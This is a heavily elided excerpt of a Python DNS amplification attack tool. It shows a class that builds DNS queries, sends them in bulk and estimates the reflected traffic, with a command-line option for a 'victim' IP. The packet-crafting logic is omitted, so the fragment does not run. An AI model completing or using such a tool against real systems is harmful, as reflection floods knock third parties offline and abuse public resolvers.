...
class DNSAmplificationAttack:
    ...
    def __init__(
        ...
        if query_type not in self.QUERY_TYPES:
            raise ValueError(
                f"Unsupported query type: {query_type}. Supported types: {', '.join(self.QUERY_TYPES.keys())}"
            )
        ...
        logger.info("Initialized DNS amplification attack simulation")
    ...
    def create_dns_query(self, dns_server: str) -> IP:
        ...
        if self.verbose:
            logger.debug(
                f"Created DNS query packet: {self.domain} {self.query_type} -> {dns_server}"
            )
    ...
    def execute(self) -> dict[str, Any]:
        ...
        logger.info(
            f"Sending {self.query_count} queries of type {self.query_type} for domain {self.domain}"
        )
    ...
    def _print_summary(self, stats: dict[str, Any]) -> None:
        ...
        logger.info(
            f"Estimated response traffic: {stats['estimated_response_traffic_bytes'] / 1024:.2f} KB"
        )
        logger.info("=" * 50)
...
def parse_arguments() -> argparse.Namespace:
    ...
    # Required arguments
    parser.add_argument(
        "-t", "--target", dest="target_ip", required=True, help="IP address of the target (victim)"
    )
    ...
    parser.add_argument(
        "-d", "--domain", dest="domain", required=True, help="Domain name to query"
    )
